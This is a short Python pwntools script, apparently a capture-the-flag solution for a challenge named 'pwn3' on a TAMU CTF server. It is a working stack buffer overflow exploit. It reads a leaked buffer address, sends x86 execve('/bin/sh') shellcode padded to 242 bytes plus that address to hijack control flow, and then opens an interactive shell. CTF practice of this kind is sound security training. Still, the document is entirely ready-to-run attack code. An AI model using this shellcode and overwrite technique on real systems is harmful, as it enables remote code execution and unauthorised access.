#!/usr/bin/env python

from pwn import *

r = remote('pwn.ctf.tamu.edu', 4323)
# r = process('./pwn3')

shellcode = "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"


r.recvuntil('number ')
buf = int(r.recvuntil('!')[:-1], 16)
r.recvuntil('echo?')
r.sendline(shellcode.ljust(242) + p32(buf))

r.interactive()
